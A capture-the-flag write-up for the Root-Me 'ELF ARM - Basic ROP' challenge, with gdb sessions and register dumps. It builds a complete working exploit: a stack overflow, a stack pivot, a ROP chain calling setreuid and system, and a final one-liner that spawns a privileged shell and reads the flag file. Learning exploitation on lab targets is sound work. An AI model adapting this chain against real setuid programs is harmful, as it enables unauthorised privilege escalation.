# ELF ARM - Basic ROP
https://www.root-me.org/en/Challenges/App-System/ELF-ARM-Basic-ROP
```
Pwn the binary, read the flag in .passwd.

Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 Yes 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 No 

Challenge connection informations :

Host	        challenge04.root-me.org
Protocol	SSH
Port	        2224
SSH access 	ssh -p 2224 app-systeme-ch46@challenge04.root-me.org    
Username	app-systeme-ch46
Password	app-systeme-ch46
```

First thing first, here's a little recon. :
```bash
app-systeme-ch46@challenge04:~$ ls -la
total 36
drwxr-x---  2 app-systeme-ch46-cracked app-systeme-ch46 4096 May 19  2017 .
drwxr-xr-x 13 root                     root             4096 Mar 17  2018 ..
-r-sr-x---  1 app-systeme-ch46-cracked app-systeme-ch46 8444 May 19  2017 ch46
-r--------  1 app-systeme-ch46-cracked app-systeme-ch46  497 May 19  2017 ch46.c
-r--------  1 app-systeme-ch46-cracked app-systeme-ch46  730 May 19  2017 Makefile
-r--r-----  1 app-systeme-ch46-cracked app-systeme-ch46   54 May 19  2017 .motd
-r--------  1 app-systeme-ch46-cracked app-systeme-ch46   24 May 19  2017 .passwd

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [... snip ...]
  [18] .init_array       INIT_ARRAY      00020ec0 000ec0 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      00020ec4 000ec4 000004 00  WA  0   0  4
  [20] .jcr              PROGBITS        00020ec8 000ec8 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         00020ecc 000ecc 0000f8 08  WA  6   0  4
  [22] .got              PROGBITS        00020fc4 000fc4 00003c 04  WA  0   0  4
  [23] .data             PROGBITS        00021000 001000 000008 00  WA  0   0  4
  [24] .bss              NOBITS          00021008 001008 000004 00  WA  0   0  1
  [... snip ...]
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```
A quick summary - there is an execuable, which its _suid_ is set on, and we'll probably need to control the _pc_ and do some roppin' (the title says so).<br><br>

If we'll execute the binary, it will display the following output:
```bash
app-systeme-ch46@challenge04:~$ ./ch46 
Give me data to dump:
1234567890
Payload is: 
31 32 33 34 35 36 37 38 39 30 
```

Well ok. let's take a look at the **main** function:
```asm
   0x00010638 <+0>:	push	{r11, lr}
   0x0001063c <+4>:	add	r11, sp, #4
   0x00010640 <+8>:	sub	sp, sp, #72	; 0x48
   0x00010644 <+12>:	str	r0, [r11, #-72]	; 0xffffffb8
   0x00010648 <+16>:	str	r1, [r11, #-76]	; 0xffffffb4
   0x0001064c <+20>:	movw	r0, #1772	; 0x6ec
   0x00010650 <+24>:	movt	r0, #1
   0x00010654 <+28>:	bl	0x10428 <puts@plt>
   0x00010658 <+32>:	sub	r3, r11, #68	; 0x44
   0x0001065c <+36>:	mov	r1, r3
   0x00010660 <+40>:	movw	r0, #1796	; 0x704
   0x00010664 <+44>:	movt	r0, #1
   0x00010668 <+48>:	bl	0x1047c <__isoc99_scanf@plt>
   0x0001066c <+52>:	sub	r3, r11, #68	; 0x44
   0x00010670 <+56>:	mov	r0, r3
   0x00010674 <+60>:	bl	0x105b4 <dump>
   0x00010678 <+64>:	mov	r3, r0
   0x0001067c <+68>:	mov	r0, r3
   0x00010680 <+72>:	sub	sp, r11, #4
   0x00010684 <+76>:	pop	{r11, pc}
```
It's a short function and pretty easy to understand what's up here - first a message is printed using **puts** ("Give me data to dump:\n"), then 64 bytes in the stack are saved for a local variable which is used for storing the **scanf**'s buffer and lastly the buffer is printed in hex values using the **dump** function.<br><br>
So, at the end of the **scanf** call, the stack would look like the following:
```
                    +-----------------------+
                    |           lr          |
                    +-----------------------+
                    |           fp          |
                    +-----------------------+
                    |                       |
                    |  64 bytes containing  | 
                    |      user's input     |
                    |                       |
                    +-----------------------+
```
Let's verify it using gdb:
```gdb
(gdb) run < <(python -c "print 'A'*64 + 'CCCC' + 'DDDD'")
Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + 'CCCC' + 'DDDD'")
Cannot parse expression `.L1185 4@r4'.
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.

Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 43 43 43 43 44 44 44 44 

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
Awesome! so we've got control on the _pc_.<br>
Before we'll start ropping, after disassembling the binary the following function came to my eye:
```asm
00010574 <exec>:
   10574:	e92d4810 	push	{r4, fp, lr}
   10578:	e28db008 	add	fp, sp, #8
   1057c:	e24dd00c 	sub	sp, sp, #12
   10580:	e50b0010 	str	r0, [fp, #-16]
   10584:	ebffffa4 	bl	1041c <geteuid@plt>
   10588:	e1a04000 	mov	r4, r0
   1058c:	ebffffa2 	bl	1041c <geteuid@plt>
   10590:	e1a03000 	mov	r3, r0
   10594:	e1a01003 	mov	r1, r3
   10598:	e1a00004 	mov	r0, r4
   1059c:	ebffffb0 	bl	10464 <setreuid@plt>
   105a0:	e51b0010 	ldr	r0, [fp, #-16]
   105a4:	ebffffa5 	bl	10440 <system@plt>
   105a8:	e320f000 	nop	{0}
   105ac:	e24bd008 	sub	sp, fp, #8
   105b0:	e8bd8810 	pop	{r4, fp, pc}

```
**system**! Let's use it.<br>
So the plan is to overwrite the _lr_ value stored in the stack, store "/bin/sh" in a writable address, set r0 and r1 to _app-systeme-ch46-cracked_ (1246), and jump to 0x10594 so the program will setreuid to a privileged user (reminder - suid is set) and run "/bin/sh" with **system**.<br>

So first, let's write "/bin/sh" in a writable address. According to the recon., the obvious place to store it is in the .data section - it has enough size (/bin/sh\x00 = 8 bytes).<br>
So, let's take a look at instructions above the **scanf** function in the **main**. The buffer which will save the user's input is set in the instruction ```sub	r3, r11, #68	; 0x44```. Then r1 gets the address (```mov	r1, r3```) and afterward _r0_ will get the address for the "%s" format string.<br>
So, let's set fp to 0x21044 and jump to there, so _r1_ will contain 0x21000 (the .data section).<br>

```gdb
(gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00'")
Cannot parse expression `.L1185 4@r4'.
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.

Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 

Breakpoint 1, 0x00010684 in main ()
(gdb) c
Continuing.
Payload is: 
2f 62 69 6e 2f 73 68 

Breakpoint 1, 0x00010684 in main ()
(gdb) x/1s 0x21000
0x21000:	"/bin/sh"
```

Awesome! so we're able to write "/bin/sh" to 0x21000.<br>
But, because we set the _fp_ to 0x21044, the _sp_ is set to 0x21040 (```sub	sp, r11, #4```). So, we'll have to pivot the stack a bit, so we'll have control on the _pc_ again.<br>
With the same logic used before, we'll need to write a buffer of 64 bytes (including the "/bin/sh\x00) and then we'll be able to control the _fp_ and the _pc_:
```gdb
(gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + 'DDDD'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + 'DDDD'")
Cannot parse expression `.L1185 4@r4'.
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.

Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
Payload is: 
2f 62 69 6e 2f 73 68 

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) 
```
Great! So, we've write "/bin/sh" into 0x21000 and we've regained control on the _fp_ and _pc_.<br><br>
Now, we'll need to set _r0_ and _r1_ to _app-systeme-ch46-cracked_'s id (1246).<br>
If you'll look just above the **setreuid** in **exec** you'll notice that _r0_ is set by _r4_ (```mov	r0, r4```) and _r1_ is set by _r3_ (```mov	r1, r3```).<br>
According to ROPgadget, there are 2 gadgets that may help us - ```pop {r3, pc}``` and ```pop {r4, fp, pc}```. So, let's chain them with our current payload:
```gdb
(gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + 'CCCC' + 'DDDD'")
Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + 'CCCC' + 'DDDD'")
Cannot parse expression `.L1185 4@r4'.
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.

Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
Payload is: 
2f 62 69 6e 2f 73 68 

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) info registers
r0             0x7	7
r1             0x0	0
r2             0x1	1
r3             0x4de	1246
r4             0x4de	1246
r5             0x0	0
r6             0x0	0
r7             0x0	0
r8             0x0	0
r9             0x0	0
r10            0xb6fe4000	3070115840
r11            0x43434343	1128481603
r12            0x0	0
sp             0x2105c	0x2105c
lr             0xb6f1c79b	-1225668709
pc             0x44444444	0x44444444
cpsr           0x60070010	1611071504
(gdb) x/3xw 0x21050
0x21050:	0x000004de	0x43434343	0x44444444
```
Now, we succeed to write "/bin/sh" to 0x21000, and set _r3_ and _r4_ to 1246 so _r1_ and _r0_ will be set to it, when we'll jump to call **setreuid**.<br>
Techincally, we're ready to jump to **setreuid**. But, unfortunately the _sp_ is to low for the **system** function. That will cause the stack to reach an unwritable address. So, we'll have to change the _sp_ before we'll jump there.<br><br>

According to ROPgadget, the ```sub sp, fp, #4 ; pop {fp, pc}``` is exactly what we need.<br>
So, in the last jump in our payload, we'll need to set _fp_ to a high enough value, so _sp_ will be there as well. In addition, because the _sp_ is now changed, we'll need to fill the address until the new value to junk bytes, so we'll be able to retake control on the _fp_ and the _pc_.<br><br>

After some tries:
```gdb
((gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + 'CCCC' + 'DDDD'")
Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + 'CCCC' + 'DDDD'")
Cannot parse expression `.L1185 4@r4'.
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.

Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
Payload is: 
2f 62 69 6e 2f 73 68 

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
(gdb) info registers
r0             0x7	7
r1             0x0	0
r2             0x1	1
r3             0x4de	1246
r4             0x4de	1246
r5             0x0	0
r6             0x0	0
r7             0x0	0
r8             0x0	0
r9             0x0	0
r10            0xb6f00000	3069181952
r11            0x43434343	1128481603
r12            0x0	0
sp             0x21304	0x21304
lr             0xb6e3879b	-1226602597
pc             0x44444444	0x44444444
cpsr           0x60070010	1611071504
```
We're able to change the _sp_ to a higher address and retake the control of _fp_ and _pc_.<br>
Now we're ready to jump to call the **setreuid**. <br>
One last thing - before the **system** function call, _r0_ is set according to this instruction ```ldr	r0, [fp, #-16]```. So, we'll need to put 0x21000 in the stack, so _fp-16_ will point to it.<br>

```gdb
(gdb) run < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + '\x14\x13\x02\x00' + '\x94\x05\x01\x00' + '\x00\x10\x02\x00'")
Starting program: /challenge/app-systeme/ch46/ch46 < <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + '\x14\x13\x02\x00' + '\x94\x05\x01\x00' + '\x00\x10\x02\x00'")
Cannot parse expression `.L1185 4@r4'.
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.

Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
Payload is: 
2f 62 69 6e 2f 73 68 

Breakpoint 1, 0x000105a4 in exec ()
(gdb) info registers
r0             0x21000	135168
r1             0xb6f4f4c0	3069506752
r2             0x10	16
r3             0x1	1
r4             0x4de	1246
r5             0x0	0
r6             0x0	0
r7             0x0	0
r8             0x0	0
r9             0x0	0
r10            0xb6f5a000	3069550592
r11            0x21314	135956
r12            0xcb	203
sp             0x21304	0x21304
lr             0xb6ed4175	-1225965195
pc             0x105a4	0x105a4 <exec+48>
cpsr           0x70010	458768
```
Awesome! So the payload is ready. Let's give it a try outside gdb.<br><br>

```sh
app-systeme-ch46@challenge04:~$ cat <(python -c "print 'A'*64 + '\x44\x10\x02\x00' + '\x58\x06\x01\x00' + '\n' + '/bin/sh\x00' + 'A'*56 + 'CCCC' + '\xf8\x03\x01\x00' + '\xde\x04\x00\x00' + '\xb0\x05\x01\x00' + '\xde\x04\x00\x00' + '\x00\x13\x02\x00' + '\x80\x06\x01\x00' + 'A'*672 + '\x14\x13\x02\x00' + '\x94\x05\x01\x00' + '\x00\x10\x02\x00'") - | ./ch46 
Give me data to dump:
Payload is: 
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 44 10 02 
Payload is: 
2f 62 69 6e 2f 73 68 
id
uid=1246(app-systeme-ch46-cracked) gid=1146(app-systeme-ch46) groups=1146(app-systeme-ch46),100(users)
cat .passwd
<censored>
```

